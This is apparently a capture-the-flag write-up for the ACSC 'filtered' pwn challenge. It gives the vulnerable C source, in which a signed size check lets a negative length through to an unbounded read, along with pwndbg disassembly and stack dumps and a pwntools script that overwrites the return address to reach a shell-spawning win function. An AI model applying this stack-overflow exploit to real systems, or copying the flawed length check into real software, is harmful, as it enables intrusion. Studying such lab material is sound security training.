# ACSC CTF

## filtered



```
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  exit(0);
}

/* Print `msg` */
void print(const char *msg) {
  write(1, msg, strlen(msg));
}

/* Print `msg` and read `size` bytes into `buf` */
void readline(const char *msg, char *buf, size_t size) {
  char c;
  print(msg);
  for (size_t i = 0; i < size; i++) {
    if (read(0, &c, 1) <= 0) {
      print("I/O Error\n");
      exit(1);
    } else if (c == '\n') {
      buf[i] = '\0';
      break;
    } else {
      buf[i] = c;
    }
  }
}

/* Print `msg` and read an integer value */
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}

/* Entry point! */
int main() {
  int length;
  char buf[0x100];

  /* Read and check length */
  length = readint("Size: ");
  if (length > 0x100) {
    print("Buffer overflow detected!\n");
    exit(1);
  }

  /* Read data */
  readline("Data: ", buf, length);
  print("Bye!\n");

  return 0;
}


```






```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000040131b <+0>:	endbr64 
   0x000000000040131f <+4>:	push   rbp
   0x0000000000401320 <+5>:	mov    rbp,rsp
   0x0000000000401323 <+8>:	sub    rsp,0x110
   0x000000000040132a <+15>:	lea    rdi,[rip+0xce6]        # 0x402017
   0x0000000000401331 <+22>:	call   0x4012e5 <readint>
   0x0000000000401336 <+27>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401339 <+30>:	cmp    DWORD PTR [rbp-0x4],0x100
   0x0000000000401340 <+37>:	jle    0x401358 <main+61>
   0x0000000000401342 <+39>:	lea    rdi,[rip+0xcd5]        # 0x40201e
   0x0000000000401349 <+46>:	call   0x401217 <print>
   0x000000000040134e <+51>:	mov    edi,0x1
   0x0000000000401353 <+56>:	call   0x4010e0 <exit@plt>
   0x0000000000401358 <+61>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040135b <+64>:	movsxd rdx,eax
   0x000000000040135e <+67>:	lea    rax,[rbp-0x110]
   0x0000000000401365 <+74>:	mov    rsi,rax
   0x0000000000401368 <+77>:	lea    rdi,[rip+0xcca]        # 0x402039
   0x000000000040136f <+84>:	call   0x40124a <readline>
   0x0000000000401374 <+89>:	lea    rdi,[rip+0xcc5]        # 0x402040
   0x000000000040137b <+96>:	call   0x401217 <print>
   0x0000000000401380 <+101>:	mov    eax,0x0
   0x0000000000401385 <+106>:	leave  
   0x0000000000401386 <+107>:	ret    
End of assembler dump.
pwndbg> 


```





```
pwndbg> b*0x401386
Breakpoint 1 at 0x401386
pwndbg> r
Starting program: /home/datnlq/CTF/ASIACTF/filtered/distfiles/filtered 
Size: 256
Data: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Bye!

Breakpoint 1, 0x0000000000401386 in main ()

```

```
pwndbg> x/x $rsp
0x7fffffffde38:	0xf7a2d840

```

```
pwndbg> b*0x0000000000401385
Breakpoint 2 at 0x401385
pwndbg> r
Starting program: /home/datnlq/CTF/ASIACTF/filtered/distfiles/filtered 
Size: 10
Data: aaaaa
Bye!

```
```
pwndbg> x/100x $rsp
0x7fffffffdd20:	0x61616161	0x00000061	0xffffdd60	0x00007fff
0x7fffffffdd30:	0x00000340	0x00000000	0xffffdd50	0x00007fff
0x7fffffffdd40:	0x6562b026	0x00000000	0xf7b99727	0x00007fff
0x7fffffffdd50:	0xffffffff	0x00000000	0xf7ffe718	0x00007fff
0x7fffffffdd60:	0xf7ffa280	0x00007fff	0xf7ffe700	0x00007fff
0x7fffffffdd70:	0xffffdd01	0x00007fff	0x519230f2	0x00000ddd
0x7fffffffdd80:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdd90:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdda0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffddb0:	0xffffdf28	0x00007fff	0x00000000	0x00000000
0x7fffffffddc0:	0x00000001	0x00000000	0xffffdf28	0x00007fff
0x7fffffffddd0:	0x00000001	0x00000000	0xffffde50	0x00007fff
0x7fffffffdde0:	0xf7ffe168	0x00007fff	0x00000000	0x00000000
0x7fffffffddf0:	0xffffdf18	0x00007fff	0x004013dd	0x00000000
0x7fffffffde00:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffde10:	0x00401390	0x00000000	0x004010f0	0x00000000
0x7fffffffde20:	0xffffdf10	0x00007fff	0x00000000	0x0000000a
0x7fffffffde30:	0x00401390	0x00000000	0xf7a2d840	0x00007fff
0x7fffffffde40:	0xffffdf18	0x00007fff	0xffffdf18	0x00007fff
0x7fffffffde50:	0xf7b99708	0x00000001	0x0040131b	0x00000000
0x7fffffffde60:	0x00000000	0x00000000	0x3f09aed7	0x4329b3bf
0x7fffffffde70:	0x004010f0	0x00000000	0xffffdf10	0x00007fff
0x7fffffffde80:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffde90:	0xa4a9aed7	0xbcd64cc0	0xb7d9aed7	0xbcd65c7a
0x7fffffffdea0:	0x00000000	0x00000000	0x00000000	0x00000000
pwndbg> 


```

```
pwndbg> p*win
$1 = {<text variable, no debug info>} 0x4011d6 <win>


```























```
from pwn import *


BIN = "./filtered"
win = 0x4011d6
ret = 0x000000000040101a
def exploit():
	payload = b"a"*280 + p64(ret) + p64(win)
	# _breakpoint="""
	# 	b*0x401386
	# 	"""
	# gdb.attach(io,_breakpoint)
	io.recvuntil("Size:")
	io.sendline("-1")
	io.recvuntil("Data:")
	io.sendline(payload)
	io.interactive()

io = process(BIN)
#io = remote("167.99.78.201", 9001)
# context.log_level = "debug"
exploit()


```